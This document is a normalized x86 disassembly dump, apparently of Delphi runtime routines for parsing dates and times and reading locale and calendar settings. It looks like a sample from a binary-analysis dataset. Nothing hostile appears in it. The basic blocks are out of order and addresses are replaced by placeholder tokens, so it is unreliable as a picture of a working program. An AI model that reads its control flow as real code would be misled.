pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40a0b4
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40a12c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40a0b4
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40a0b4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40a0b4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a414
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a414
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40a0b4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ce4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40a050
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a414
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40a050
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40a050
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40a094
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f3c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a094
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ce4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40a050
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_40a050
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40a094
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f3c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a094
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c970
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ce4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40a050
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a414
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40a0b4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ce4
test eax eax
jne r-xdata
push ebp
call sub_40a12c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f3c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a094
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a094
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a094
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c970
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a414
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40a050
pop ecx
jmp r-xdata
push ebp
call sub_40a12c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f3c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40a094
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408ce4
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ce4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ce4
test eax eax
jne r-xdata
jmp r-xdata
sub_40abc8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a414
pop ecx
push ebp
mov eax ebx
call sub_40a414
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404208
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40ac64
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4043d8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40ac88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ac64
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4043d8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40ad1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ad95
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad9c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40ac64
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4043d8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404638
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_408210
test eax eax
jne r-xdata
mov eax edi
call sub_4043d8
add [ esi ] eax
mov bl 0x1
sub_40ada8
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40ac64
mov eax esi
call sub_4043d8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40ade0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4043d8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40ae2c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4043d8
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c9b4
mov [ ebx ] eax
jmp r-xdata
sub_40ae74
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4045d8
push eax
mov eax [ ebx ]
call sub_4045d8
pop edx
call sub_40ca9c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40aec8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_40a03c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40af24
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40b23f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40ade0
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40ca64
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40ac88
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40ae2c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404638
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408280
mov eax [ ebp - 0x1c ]
call sub_40ae74
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b246
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_40413c
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ada8
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40ac88
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ada8
test al al
je r-xdata
call sub_40a03c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40ac88
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409c28
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_40471c
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ada8
mov edx ebx
mov eax esi
call sub_40ac64
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4043d8
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40ae2c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40aec8
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ac64
mov eax esi
call sub_4043d8
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_40a03c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4043d8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404638
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_408210
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4043d8
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404638
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_408210
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b268
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ad1c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ad1c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ad1c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40ac88
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ac64
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ad1c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ada8
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40ac88
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ad1c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ada8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ac64
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409ae0
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ad1c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40ac88
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ad1c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ada8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ad1c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40ac88
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b45c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40af24
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4043d8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b490
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b268
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4043d8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b4c4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_40b4f8
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0xb
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407fbc
sub_40b4f8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40af24
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b490
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4043d8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b268
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b584
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404208
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b5d0
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_40416c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404208
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b61c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b644
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b5d0
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405f7c
sub_40b680
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b793
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b644
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40416c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b644
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40416c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b644
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40416c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b644
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40416c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b79a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40413c
retn
sub_40b7a4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404310
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b7e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b845
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404310
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408684
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b84c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
inc ebx
sub_40b858
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b8ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b5d0
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408684
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b8f6
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b7a4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b7e0
call EnumCalendarInfoA
sub_40b908
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40bad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404118
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b5d0
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408684
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4043d8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bad9
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40413c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408ce4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
